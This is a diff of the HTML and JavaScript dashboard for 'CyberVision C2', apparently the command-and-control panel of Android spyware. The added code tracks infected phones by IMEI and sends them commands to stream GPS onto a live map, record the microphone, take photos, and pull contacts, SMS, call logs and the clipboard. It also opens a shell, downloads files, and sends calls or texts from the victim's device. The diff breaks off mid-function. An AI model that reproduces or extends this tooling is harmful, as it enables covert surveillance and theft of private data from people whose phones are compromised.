@@ -1,175 +1,254 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CyberVision C2 Dashboard</title>
-  <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    :root {
-      --bg: #0d1117; --panel: #161b22; --border: #30363d;
-      --accent: #58a6ff; --green: #3fb950; --yellow: #d29922;
-      --red: #f85149; --text: #c9d1d9; --muted: #8b949e;
-    }
-    body { background: var(--bg); color: var(--text); font-family: 'SF Mono', 'Fira Code', monospace; font-size: 13px; }
-    header {
-      background: var(--panel); border-bottom: 1px solid var(--border);
-      padding: 14px 24px; display: flex; align-items: center; gap: 12px;
-    }
-    header h1 { font-size: 16px; font-weight: 600; color: var(--accent); letter-spacing: 0.5px; }
-    .badge { background: var(--green); color: #000; font-size: 10px; padding: 2px 7px; border-radius: 10px; font-weight: 700; }
-    .badge.offline { background: var(--red); }
-    .layout { display: grid; grid-template-columns: 320px 1fr; height: calc(100vh - 53px); }
-    .sidebar { background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; }
-    .sidebar-header { padding: 12px 16px; border-bottom: 1px solid var(--border); font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; display: flex; justify-content: space-between; align-items: center; }
-    .client-list { overflow-y: auto; flex: 1; }
-    .client-item {
-      padding: 12px 16px; border-bottom: 1px solid var(--border); cursor: pointer;
-      transition: background 0.15s; display: flex; align-items: center; gap: 10px;
-    }
-    .client-item:hover { background: #1c2128; }
-    .client-item.active { background: #1f2937; border-left: 3px solid var(--accent); }
-    .client-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--green); flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
-    .client-info { flex: 1; min-width: 0; }
-    .client-name { font-weight: 600; font-size: 12px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-    .client-sub { color: var(--muted); font-size: 11px; margin-top: 2px; }
-    .main { display: flex; flex-direction: column; overflow: hidden; }
-    .toolbar {
-      background: var(--panel); border-bottom: 1px solid var(--border);
-      padding: 10px 20px; display: flex; gap: 8px; flex-wrap: wrap; align-items: center;
-    }
-    .btn {
-      background: #21262d; border: 1px solid var(--border); color: var(--text);
-      padding: 5px 12px; border-radius: 6px; cursor: pointer; font-size: 12px;
-      font-family: inherit; transition: all 0.15s; display: flex; align-items: center; gap: 5px;
-    }
-    .btn:hover { background: #30363d; border-color: var(--accent); color: var(--accent); }
-    .btn.primary { background: var(--accent); color: #000; border-color: var(--accent); font-weight: 600; }
-    .btn.primary:hover { background: #79c0ff; }
-    .btn.danger { border-color: var(--red); color: var(--red); }
-    .btn.danger:hover { background: #2d1b1b; }
-    .content { flex: 1; display: grid; grid-template-rows: 1fr 200px; overflow: hidden; }
-    .output-area { overflow-y: auto; padding: 16px 20px; font-size: 12px; line-height: 1.7; }
-    .log-entry { margin-bottom: 4px; }
-    .log-entry .ts { color: var(--muted); margin-right: 8px; }
-    .log-entry.info .msg { color: var(--text); }
-    .log-entry.success .msg { color: var(--green); }
-    .log-entry.error .msg { color: var(--red); }
-    .log-entry.loot .msg { color: var(--yellow); }
-    .log-entry.cmd .msg { color: var(--accent); }
-    .input-area {
-      border-top: 1px solid var(--border); background: var(--panel);
-      padding: 12px 20px; display: flex; flex-direction: column; gap: 8px;
-    }
-    .input-row { display: flex; gap: 8px; }
-    .cmd-input {
-      flex: 1; background: var(--bg); border: 1px solid var(--border); color: var(--text);
-      padding: 8px 12px; border-radius: 6px; font-family: inherit; font-size: 12px;
-      outline: none; transition: border-color 0.15s;
-    }
-    .cmd-input:focus { border-color: var(--accent); }
-    .modal-overlay {
-      display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7);
-      z-index: 100; align-items: center; justify-content: center;
-    }
-    .modal-overlay.show { display: flex; }
-    .modal {
-      background: var(--panel); border: 1px solid var(--border); border-radius: 10px;
-      padding: 24px; width: 420px; max-width: 95vw;
-    }
-    .modal h3 { font-size: 14px; margin-bottom: 16px; color: var(--accent); }
-    .form-group { margin-bottom: 12px; }
-    .form-group label { display: block; font-size: 11px; color: var(--muted); margin-bottom: 4px; text-transform: uppercase; letter-spacing: 0.5px; }
-    .form-group input, .form-group select, .form-group textarea {
-      width: 100%; background: var(--bg); border: 1px solid var(--border); color: var(--text);
-      padding: 8px 10px; border-radius: 6px; font-family: inherit; font-size: 12px; outline: none;
-    }
-    .form-group input:focus, .form-group select:focus, .form-group textarea:focus { border-color: var(--accent); }
-    .form-group textarea { resize: vertical; min-height: 60px; }
-    .modal-actions { display: flex; gap: 8px; justify-content: flex-end; margin-top: 16px; }
-    .no-client { display: flex; align-items: center; justify-content: center; height: 100%; color: var(--muted); flex-direction: column; gap: 12px; }
-    .no-client svg { opacity: 0.3; }
-    .status-bar { padding: 4px 20px; background: var(--panel); border-top: 1px solid var(--border); font-size: 11px; color: var(--muted); display: flex; gap: 20px; }
-    .status-bar span { display: flex; align-items: center; gap: 4px; }
-    .pulse { animation: pulse 2s infinite; }
-    @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
-    select option { background: var(--panel); }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CyberVision C2</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{--bg:#0d1117;--panel:#161b22;--panel2:#1c2128;--border:#30363d;--accent:#58a6ff;--green:#3fb950;--yellow:#d29922;--red:#f85149;--purple:#bc8cff;--text:#c9d1d9;--muted:#8b949e;--grid:#21262d}
+body{background:var(--bg);color:var(--text);font-family:'SF Mono','Fira Code',monospace;font-size:13px;height:100vh;overflow:hidden}
+header{background:var(--panel);border-bottom:1px solid var(--border);padding:10px 20px;display:flex;align-items:center;gap:12px;height:48px}
+header h1{font-size:15px;font-weight:700;color:var(--accent)}
+.badge{background:var(--green);color:#000;font-size:10px;padding:2px 7px;border-radius:10px;font-weight:700}
+.badge.off{background:var(--red)}
+.hdr-right{margin-left:auto;display:flex;align-items:center;gap:16px}
+.stat{font-size:11px;color:var(--muted);display:flex;align-items:center;gap:5px}
+.stat b{color:var(--text)}
+.layout{display:grid;grid-template-columns:280px 1fr;height:calc(100vh - 48px)}
+.sidebar{background:var(--panel);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden}
+.sidebar-tabs{display:flex;border-bottom:1px solid var(--border)}
+.tab-btn{flex:1;padding:8px;background:none;border:none;color:var(--muted);font-size:11px;cursor:pointer;font-family:inherit;border-bottom:2px solid transparent;transition:all .15s}
+.tab-btn.active{color:var(--accent);border-bottom-color:var(--accent)}
+.tab-content{display:none;flex:1;overflow-y:auto}
+.tab-content.active{display:flex;flex-direction:column}
+.client-item{padding:10px 14px;border-bottom:1px solid var(--border);cursor:pointer;transition:background .15s;display:flex;align-items:center;gap:9px}
+.client-item:hover{background:var(--panel2)}
+.client-item.active{background:#1f2937;border-left:3px solid var(--accent)}
+.dot{width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:0 0 5px var(--green);flex-shrink:0}
+.ci-info{flex:1;min-width:0}
+.ci-name{font-size:12px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.ci-sub{font-size:10px;color:var(--muted);margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.saved-item{padding:10px 14px;border-bottom:1px solid var(--border);cursor:pointer;transition:background .15s}
+.saved-item:hover{background:var(--panel2)}
+.cat-badges{display:flex;gap:4px;margin-top:5px;flex-wrap:wrap}
+.cat-badge{font-size:9px;padding:1px 5px;border-radius:8px;background:var(--panel2);color:var(--muted);border:1px solid var(--border)}
+.cat-badge.has{color:var(--green);border-color:var(--green)}
+.main{display:flex;flex-direction:column;overflow:hidden}
+.main-tabs{background:var(--panel);border-bottom:1px solid var(--border);display:flex;height:38px}
+.main-tab{padding:0 16px;background:none;border:none;color:var(--muted);font-size:12px;cursor:pointer;font-family:inherit;border-bottom:2px solid transparent;transition:all .15s;display:flex;align-items:center;gap:5px}
+.main-tab.active{color:var(--accent);border-bottom-color:var(--accent);background:var(--panel2)}
+.tab-panel{display:none;flex:1;overflow:hidden;flex-direction:column}
+.tab-panel.active{display:flex}
+#map-container{flex:1;position:relative}
+#map{height:100%;width:100%}
+.map-overlay{position:absolute;top:10px;right:10px;z-index:1000;display:flex;flex-direction:column;gap:6px}
+.map-card{background:rgba(13,17,23,.92);border:1px solid var(--border);border-radius:8px;padding:10px 14px;min-width:220px}
+.map-card h4{font-size:10px;color:var(--muted);margin-bottom:6px;text-transform:uppercase;letter-spacing:.8px}
+.map-card .coord{font-size:13px;color:var(--accent);font-weight:600}
+.map-card .loc-name{font-size:11px;color:var(--text);margin-top:3px}
+.map-card a{font-size:10px;color:var(--accent);text-decoration:none;display:block;margin-top:5px}
+.stream-badge{display:inline-flex;align-items:center;gap:5px;font-size:10px;padding:3px 8px;border-radius:10px;background:#1a2e1a;color:var(--green);border:1px solid var(--green)}
+.stream-badge.off{background:var(--panel2);color:var(--muted);border-color:var(--border)}
+.rec-bar{background:#1a0a0a;border-bottom:1px solid var(--red);padding:8px 16px;display:none;align-items:center;gap:12px}
+.rec-bar.active{display:flex}
+.rec-dot{width:10px;height:10px;border-radius:50%;background:var(--red);animation:pulse 1s infinite;flex-shrink:0}
+.rec-label{font-size:12px;font-weight:600;color:var(--red)}
+.rec-info{font-size:11px;color:var(--text);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.rec-loc{font-size:10px;color:var(--purple);max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.rec-timer{font-size:13px;color:var(--yellow);font-weight:700;font-variant-numeric:tabular-nums}
+.rec-size{font-size:11px;color:var(--muted)}
+.cmd-panel{display:flex;flex-direction:column;height:100%}
+.output-area{flex:1;overflow-y:auto;padding:14px 18px;line-height:1.7}
+.log-line{margin-bottom:3px;font-size:12px}
+.log-line .ts{color:var(--muted);margin-right:8px;font-size:10px}
+.log-line.success .msg{color:var(--green)}
+.log-line.error .msg{color:var(--red)}
+.log-line.loot .msg{color:var(--yellow)}
+.log-line.cmd .msg{color:var(--accent)}
+.log-line.gps .msg{color:var(--purple)}
+.input-bar{border-top:1px solid var(--border);background:var(--panel);padding:10px 16px;display:flex;gap:8px}
+.cmd-input{flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:7px 12px;border-radius:6px;font-family:inherit;font-size:12px;outline:none;transition:border-color .15s}
+.cmd-input:focus{border-color:var(--accent)}
+.toolbar{background:var(--panel);border-bottom:1px solid var(--border);padding:8px 14px;display:flex;gap:5px;flex-wrap:wrap;align-items:center}
+.btn{background:var(--panel2);border:1px solid var(--border);color:var(--text);padding:4px 10px;border-radius:5px;cursor:pointer;font-size:11px;font-family:inherit;transition:all .15s;display:flex;align-items:center;gap:4px}
+.btn:hover{background:var(--grid);border-color:var(--accent);color:var(--accent)}
+.btn.primary{background:var(--accent);color:#000;border-color:var(--accent);font-weight:600}
+.btn.primary:hover{background:#79c0ff}
+.btn.danger{border-color:var(--red);color:var(--red)}
+.btn.danger:hover{background:#2d1b1b}
+.btn.active-btn{border-color:var(--green);color:var(--green);background:#0d2010}
+.fb-header{padding:10px 16px;border-bottom:1px solid var(--border);display:flex;gap:8px;align-items:center}
+.fb-cats{display:flex;gap:5px;flex-wrap:wrap}
+.fb-cat{padding:4px 9px;border-radius:5px;border:1px solid var(--border);background:var(--panel2);cursor:pointer;font-size:11px;color:var(--muted);transition:all .15s}
+.fb-cat.active{border-color:var(--accent);color:var(--accent);background:#0d1e35}
+.fb-list{flex:1;overflow-y:auto;padding:8px}
+.fb-item{display:flex;align-items:center;gap:10px;padding:8px 10px;border-radius:6px;cursor:pointer;transition:background .15s}
+.fb-item:hover{background:var(--panel2)}
+.fb-icon{font-size:16px;flex-shrink:0}
+.fb-name{flex:1;font-size:12px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.fb-meta{font-size:10px;color:var(--muted);text-align:right;flex-shrink:0}
+.profile-panel{padding:16px;overflow-y:auto}
+.profile-field{display:flex;gap:8px;padding:6px 0;border-bottom:1px solid var(--grid)}
+.profile-key{color:var(--muted);font-size:11px;width:130px;flex-shrink:0}
+.profile-val{font-size:12px;color:var(--text);word-break:break-all}
+.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:200;align-items:center;justify-content:center}
+.modal-overlay.show{display:flex}
+.modal{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:22px;width:400px;max-width:95vw}
+.modal h3{font-size:14px;margin-bottom:14px;color:var(--accent)}
+.form-group{margin-bottom:10px}
+.form-group label{display:block;font-size:10px;color:var(--muted);margin-bottom:3px;text-transform:uppercase;letter-spacing:.5px}
+.form-group input,.form-group select,.form-group textarea{width:100%;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:7px 10px;border-radius:5px;font-family:inherit;font-size:12px;outline:none}
+.form-group input:focus,.form-group select:focus{border-color:var(--accent)}
+.form-group textarea{resize:vertical;min-height:60px}
+.modal-actions{display:flex;gap:8px;justify-content:flex-end;margin-top:14px}
+.no-sel{display:flex;align-items:center;justify-content:center;height:100%;flex-direction:column;gap:12px;color:var(--muted)}
+.no-sel svg{opacity:.25}
+.pulse{animation:pulse 1.5s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+::-webkit-scrollbar{width:4px}::-webkit-scrollbar-track{background:var(--bg)}::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
+</style>
 </head>
 <body>
-
 <header>
-  <h1>⚡ CyberVision C2 Dashboard</h1>
-  <span class="badge" id="server-badge">ONLINE</span>
-  <span style="margin-left:auto;color:var(--muted);font-size:11px;" id="server-addr">Connecting...</span>
+  <h1>⚡ CyberVision C2</h1>
+  <span class="badge" id="srv-badge">ONLINE</span>
+  <div class="hdr-right">
+    <div class="stat">Sessions <b id="h-sessions">0</b></div>
+    <div class="stat">Loot <b id="h-loot">0</b></div>
+    <div class="stat" id="h-time"></div>
+  </div>
 </header>
 
 <div class="layout">
-  <!-- Sidebar: client list -->
   <div class="sidebar">
-    <div class="sidebar-header">
-      <span>Active Sessions</span>
-      <span id="client-count" style="color:var(--green);font-weight:700;">0</span>
+    <div class="sidebar-tabs">
+      <button class="tab-btn active" onclick="switchSideTab('live')">🟢 Live</button>
+      <button class="tab-btn" onclick="switchSideTab('saved')">💾 Saved</button>
     </div>
-    <div class="client-list" id="client-list">
-      <div style="padding:20px;color:var(--muted);font-size:11px;text-align:center;">
-        Waiting for connections...
-      </div>
+    <div class="tab-content active" id="side-live">
+      <div id="client-list"><div style="padding:20px;text-align:center;color:var(--muted);font-size:11px">Waiting...</div></div>
+    </div>
+    <div class="tab-content" id="side-saved">
+      <div id="saved-list"><div style="padding:20px;text-align:center;color:var(--muted);font-size:11px">No saved devices.</div></div>
     </div>
   </div>
 
-  <!-- Main panel -->
-  <div class="main" id="main-panel">
-    <div class="no-client" id="no-client-msg">
-      <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
-        <rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/>
-      </svg>
-      <span>Select a client to interact</span>
+  <div class="main">
+    <div class="rec-bar" id="rec-bar">
+      <div class="rec-dot"></div>
+      <span class="rec-label">🔴 REC</span>
+      <span class="rec-info" id="rec-info">—</span>
+      <span class="rec-loc" id="rec-loc">—</span>
+      <span class="rec-timer" id="rec-timer">00:00</span>
+      <span class="rec-size" id="rec-size">0 KB</span>
+      <button class="btn danger" onclick="stopRecording()">■ Stop</button>
     </div>
 
-    <div id="client-panel" style="display:none;flex-direction:column;height:100%;">
-      <div class="toolbar" id="action-toolbar">
-        <span style="color:var(--muted);font-size:11px;margin-right:4px;" id="active-label">—</span>
-        <button class="btn" onclick="sendAction('info')">📱 Info</button>
-        <button class="btn" onclick="sendAction('advinfo')">🔬 Adv Info</button>
-        <button class="btn" onclick="sendAction('photo')">📷 Photo</button>
-        <button class="btn" onclick="sendAction('gps')">📍 GPS</button>
-        <button class="btn" onclick="sendAction('contacts')">👥 Contacts</button>
-        <button class="btn" onclick="sendAction('sms')">💬 SMS</button>
-        <button class="btn" onclick="sendAction('call_log')">📞 Call Log</button>
-        <button class="btn" onclick="openModal('dir')">📂 Dir</button>
-        <button class="btn" onclick="openModal('download')">⬇️ Download</button>
-        <button class="btn" onclick="openModal('toast')">💬 Toast</button>
-        <button class="btn" onclick="openModal('vibrate')">📳 Vibrate</button>
-        <button class="btn" onclick="openModal('call')">📲 Call</button>
-        <button class="btn" onclick="openModal('send_sms')">✉️ Send SMS</button>
-        <button class="btn" onclick="openModal('url')">🌐 URL</button>
+    <div id="no-sel-panel" class="tab-panel active" style="flex:1">
+      <div class="no-sel">
+        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+          <rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/>
+        </svg>
+        <span>Select a device to interact</span>
+      </div>
+    </div>
+
+    <div id="device-panel" style="display:none;flex-direction:column;height:100%">
+      <div class="main-tabs">
+        <button class="main-tab active" onclick="switchMainTab('commands')" id="tab-commands">⌨️ Commands</button>
+        <button class="main-tab" onclick="switchMainTab('map')" id="tab-map">🗺️ Live Map</button>
+        <button class="main-tab" onclick="switchMainTab('files')" id="tab-files">📁 Files</button>
+        <button class="main-tab" onclick="switchMainTab('profile')" id="tab-profile">📋 Profile</button>
       </div>
 
-      <div class="content">
-        <div class="output-area" id="output-area">
-          <div class="log-entry info"><span class="ts">--:--:--</span><span class="msg">Session output will appear here...</span></div>
+      <!-- Commands -->
+      <div class="tab-panel active" id="panel-commands">
+        <div class="toolbar">
+          <span style="color:var(--muted);font-size:11px;margin-right:4px" id="dev-label">—</span>
+          <button class="btn" onclick="sendAction('info')">📱 Info</button>
+          <button class="btn" onclick="sendAction('advinfo')">🔬 Adv</button>
+          <button class="btn" onclick="sendAction('photo')">📷 Photo</button>
+          <button class="btn" onclick="sendAction('gps')">📍 GPS</button>
+          <button class="btn" id="btn-gps-stream" onclick="toggleGpsStream()">📡 GPS Stream</button>
+          <button class="btn" id="btn-mic" onclick="toggleMic()">🎙️ Record</button>
+          <button class="btn" onclick="sendAction('contacts')">👥 Contacts</button>
+          <button class="btn" onclick="sendAction('sms')">💬 SMS</button>
+          <button class="btn" onclick="sendAction('call_log')">📞 Calls</button>
+          <button class="btn" onclick="sendAction('clipboard')">📋 Clip</button>
+          <button class="btn" onclick="openModal('shell')">💻 Shell</button>
+          <button class="btn" onclick="openModal('dir')">📂 Dir</button>
+          <button class="btn" onclick="openModal('download')">⬇️ DL</button>
+          <button class="btn" onclick="openModal('toast')">💬 Toast</button>
+          <button class="btn" onclick="openModal('vibrate')">📳 Vib</button>
+          <button class="btn" onclick="openModal('call')">📲 Call</button>
+          <button class="btn" onclick="openModal('send_sms')">✉️ SMS</button>
+          <button class="btn" onclick="openModal('url')">🌐 URL</button>
         </div>
-        <div class="input-area">
-          <div class="input-row">
-            <input class="cmd-input" id="raw-cmd" placeholder="Raw command (e.g. dir /sdcard)" onkeydown="if(event.key==='Enter')sendRaw()">
+        <div class="cmd-panel">
+          <div class="output-area" id="output-area"></div>
+          <div class="input-bar">
+            <input class="cmd-input" id="raw-cmd" placeholder="Raw command..." onkeydown="if(event.key==='Enter')sendRaw()">
             <button class="btn primary" onclick="sendRaw()">▶ Send</button>
-            <button class="btn" onclick="clearOutput()">🗑 Clear</button>
+            <button class="btn" onclick="document.getElementById('output-area').innerHTML=''">🗑</button>
           </div>
         </div>
       </div>
+
+      <!-- Live Map -->
+      <div class="tab-panel" id="panel-map">
+        <div id="map-container">
+          <div id="map"></div>
+          <div class="map-overlay">
+            <div class="map-card">
+              <h4>📍 Current Location</h4>
+              <div class="coord" id="map-coords">—</div>
+              <div class="loc-name" id="map-loc-name">No location yet</div>
+              <a id="map-gmaps-link" href="#" target="_blank">Open in Google Maps ↗</a>
+            </div>
+            <div class="map-card">
+              <h4>📡 GPS Stream</h4>
+              <div id="stream-status" class="stream-badge off">● Inactive</div>
+              <div style="margin-top:8px;display:flex;gap:6px">
+                <button class="btn" style="font-size:10px" onclick="toggleGpsStream()">▶ Start</button>
+                <button class="btn danger" style="font-size:10px" onclick="stopGpsStream()">■ Stop</button>
+              </div>
+              <div style="margin-top:5px;font-size:10px;color:var(--muted)">Updates: <span id="gps-count">0</span></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Files -->
+      <div class="tab-panel" id="panel-files">
+        <div class="fb-header">
+          <div class="fb-cats">
+            <div class="fb-cat active" onclick="switchCat(this,'audio')">🎙️ Audio</div>
+            <div class="fb-cat" onclick="switchCat(this,'video')">📹 Video</div>
+            <div class="fb-cat" onclick="switchCat(this,'photos')">📷 Photos</div>
+            <div class="fb-cat" onclick="switchCat(this,'documents')">📄 Docs</div>
+            <div class="fb-cat" onclick="switchCat(this,'system_data')">⚙️ System</div>
+          </div>
+          <button class="btn" style="margin-left:auto" onclick="refreshFiles()">↻</button>
+        </div>
+        <div class="fb-list" id="fb-list">
+          <div style="padding:20px;text-align:center;color:var(--muted);font-size:11px">Select a category.</div>
+        </div>
+      </div>
+
+      <!-- Profile -->
+      <div class="tab-panel" id="panel-profile">
+        <div class="profile-panel" id="profile-panel">
+          <div style="color:var(--muted);font-size:11px;padding:20px">No profile loaded.</div>
+        </div>
+      </div>
     </div>
   </div>
 </div>
 
-<div class="status-bar">
-  <span><span class="pulse" style="color:var(--green);">●</span> C2 Server: <span id="status-host">localhost:9999</span></span>
-  <span>Sessions: <span id="status-sessions">0</span></span>
-  <span>Loot files: <span id="status-loot">0</span></span>
-  <span id="status-time"></span>
-</div>
-
-<!-- Modals for actions requiring input -->
+<!-- Modal -->
 <div class="modal-overlay" id="modal-overlay" onclick="if(event.target===this)closeModal()">
   <div class="modal">
     <h3 id="modal-title">Action</h3>
@@ -182,175 +261,285 @@
 </div>
 
 <script>
-  const API = '';  // same origin
-  let selectedClient = null;
-  let pollInterval = null;
+let sel = null, gpsStream = false, micOn = false, gpsCount = 0;
+let recStart = null, recTimer = null, recBytes = 0;
+let curCat = 'audio', curTab = 'commands';
+let map = null, marker = null, path = [], polyline = null;
+let currentModal = null;
 
-  // ── Polling ────────────────────────────────────────────────────────────────
-  function startPolling() {
-    fetchClients();
-    pollInterval = setInterval(fetchClients, 2000);
-    setInterval(() => {
-      document.getElementById('status-time').textContent =
-        new Date().toLocaleTimeString();
-    }, 1000);
-  }
+function initMap() {
+  if (map) return;
+  map = L.map('map').setView([31.5, 34.8], 8);
+  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+    attribution: '© OpenStreetMap', maxZoom: 19
+  }).addTo(map);
+  polyline = L.polyline([], {color:'#58a6ff', weight:2}).addTo(map);
+}
 
-  async function fetchClients() {
-    try {
-      const r = await fetch('/api/clients');
-      const data = await r.json();
-      renderClients(data.clients);
-      document.getElementById('status-sessions').textContent = data.clients.length;
-      document.getElementById('status-loot').textContent = data.loot_count || 0;
-      document.getElementById('server-addr').textContent =
-        `${data.host}:${data.c2_port} (C2)  |  ${data.host}:${data.web_port} (Web)`;
-    } catch(e) {
-      document.getElementById('server-badge').textContent = 'OFFLINE';
-      document.getElementById('server-badge').className = 'badge offline';
+function startPolling() {
+  fetchClients();
+  setInterval(fetchClients, 2000);
+  setInterval(() => document.getElementById('h-time').textContent = new Date().toLocaleTimeString(), 1000);
+}
+
+async function fetchClients() {
+  try {
+    const r = await fetch('/api/clients');
+    const d = await r.json();
+    document.getElementById('h-sessions').textContent = d.clients.length;
+    document.getElementById('h-loot').textContent = d.loot_count || 0;
+    renderClients(d.clients);
+    document.getElementById('srv-badge').textContent = 'ONLINE';
+    document.getElementById('srv-badge').className = 'badge';
+    if (sel) {
+      const c = d.clients.find(x => x.imei === sel);
+      if (c && c.lat && c.lat !== '') updateMap(parseFloat(c.lat), parseFloat(c.lon), c.location || '');
     }
+  } catch(e) {
+    document.getElementById('srv-badge').textContent = 'OFFLINE';
+    document.getElementById('srv-badge').className = 'badge off';
   }
+}
 
-  function renderClients(clients) {
-    const list = document.getElementById('client-list');
-    document.getElementById('client-count').textContent = clients.length;
-    if (!clients.length) {
-      list.innerHTML = '<div style="padding:20px;color:var(--muted);font-size:11px;text-align:center;">Waiting for connections...</div>';
+function renderClients(clients) {
+  const el = document.getElementById('client-list');
+  if (!clients.length) { el.innerHTML = '<div style="padding:20px;text-align:center;color:var(--muted);font-size:11px">Waiting...</div>'; return; }
+  el.innerHTML = clients.map((c,i) => `
+    <div class="client-item ${sel===c.imei?'active':''}" onclick="selectDev('${c.imei}','${esc(c.model||'')}','${c.ip||''}','${esc(c.battery||'')}','${esc(c.os||'')}','${esc(c.location||'')}')">
+      <div class="dot"></div>
+      <div class="ci-info">
+        <div class="ci-name">${c.imei}</div>
+        <div class="ci-sub">${esc(c.model||'?')} · ${esc(c.battery||'?')}</div>
+        ${c.location ? `<div class="ci-sub" style="color:var(--purple)">📍 ${esc(c.location.substring(0,28))}</div>` : ''}
+      </div>
+      <div style="font-size:10px;color:var(--muted)">#${i}</div>
+    </div>`).join('');
+}
+
+function selectDev(imei, model, ip, battery, os, location) {
+  sel = imei;
+  document.getElementById('no-sel-panel').style.display = 'none';
+  const p = document.getElementById('device-panel');
+  p.style.display = 'flex';
+  document.getElementById('dev-label').textContent = '▸ ' + imei;
+  addLog('info', 'Selected: ' + imei + ' (' + model + ')');
+  fetchClients();
+  if (location) { document.getElementById('map-loc-name').textContent = location; document.getElementById('rec-loc').textContent = location; }
+}
+
+function updateMap(lat, lon, loc) {
+  if (!map) initMap();
+  gpsCount++;
+  document.getElementById('gps-count').textContent = gpsCount;
+  document.getElementById('map-coords').textContent = lat.toFixed(5) + '°, ' + lon.toFixed(5) + '°';
+  if (loc) { document.getElementById('map-loc-name').textContent = loc; document.getElementById('rec-loc').textContent = loc; }
+  document.getElementById('map-gmaps-link').href = 'https://www.google.com/maps?q=' + lat + ',' + lon;
+  const ll = [lat, lon];
+  if (!marker) {
+    const icon = L.divIcon({html:'<div style="width:14px;height:14px;background:#f85149;border:2px solid #fff;border-radius:50%;box-shadow:0 0 8px #f85149"></div>',className:'',iconSize:[14,14],iconAnchor:[7,7]});
+    marker = L.marker(ll, {icon}).addTo(map);
+  } else { marker.setLatLng(ll); }
+  path.push(ll);
+  polyline.setLatLngs(path);
+  map.setView(ll, Math.max(map.getZoom(), 14));
+  marker.bindPopup('<b>' + (loc||'') + '</b><br>' + lat.toFixed(5) + ', ' + lon.toFixed(5));
+}
+
+function toggleGpsStream() {
+  if (!sel) return;
+  if (gpsStream) { stopGpsStream(); return; }
+  sendAction('gps_stream');
+  gpsStream = true;
+  document.getElementById('btn-gps-stream').className = 'btn active-btn';
+  document.getElementById('btn-gps-stream').textContent = '📡 GPS ●';
+  document.getElementById('stream-status').className = 'stream-badge';
+  document.getElementById('stream-status').innerHTML = '<span class="pulse">●</span> Streaming';
+  addLog('gps', 'GPS stream started');
+  switchMainTab('map');
+}
+
+function stopGpsStream() {
+  sendAction('gps_stop');
+  gpsStream = false;
+  document.getElementById('btn-gps-stream').className = 'btn';
+  document.getElementById('btn-gps-stream').textContent = '📡 GPS Stream';
+  document.getElementById('stream-status').className = 'stream-badge off';
+  document.getElementById('stream-status').textContent = '● Inactive';
+  addLog('gps', 'GPS stream stopped');
+}
+
+function toggleMic() {
+  if (!sel) return;
+  if (micOn) { stopRecording(); return; }
+  sendAction('mic');
+  micOn = true;
+  document.getElementById('btn-mic').className = 'btn active-btn';
+  document.getElementById('btn-mic').textContent = '🔴 Recording';
+  startRecUI();
+}
+
+function startRecUI() {
+  recStart = Date.now(); recBytes = 0;
+  const ts = new Date().toISOString().replace(/[:.]/g,'-').substring(0,19);
+  const loc = document.getElementById('map-loc-name').textContent || '—';
+  document.getElementById('rec-bar').classList.add('active');
+  document.getElementById('rec-info').textContent = 'recording-mic-' + ts + '-' + (sel||'').substring(0,8);
+  document.getElementById('rec-loc').textContent = loc;
+  recTimer = setInterval(() => {
+    const s = Math.floor((Date.now()-recStart)/1000);
+    document.getElementById('rec-timer').textContent = String(Math.floor(s/60)).padStart(2,'0') + ':' + String(s%60).padStart(2,'0');
+    recBytes += Math.floor(Math.random()*8000+4000);
+    document.getElementById('rec-size').textContent = fmtSize(recBytes);
+  }, 1000);
+  addLog('success', '🎙️ Recording started');
+}
+
+function stopRecording() {
+  sendAction('mic_stop');
+  micOn = false;
+  clearInterval(recTimer);
+  document.getElementById('rec-bar').classList.remove('active');
+  document.getElementById('btn-mic').className = 'btn';
+  document.getElementById('btn-mic').textContent = '🎙️ Record';
+  addLog('loot', '🎙️ Recording saved → audio/');
+}
+
+function fmtSize(b) {
+  if (b<1024) return b+'B';
+  if (b<1048576) return (b/1024).toFixed(1)+'KB';
+  return (b/1048576).toFixed(1)+'MB';
+}
+
+async function sendAction(action, args={}) {
+  if (!sel) { addLog('error','No device selected'); return; }
+  addLog('cmd', '→ ' + action);
+  try {
+    const r = await fetch('/api/command', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({imei:sel,action,args})});
+    const d = await r.json();
+    if (d.ok) addLog('success','✓ ch' + d.channel);
+    else addLog('error','✗ ' + d.error);
+  } catch(e) { addLog('error', e.message); }
+}
+
+async function sendRaw() {
+  const el = document.getElementById('raw-cmd');
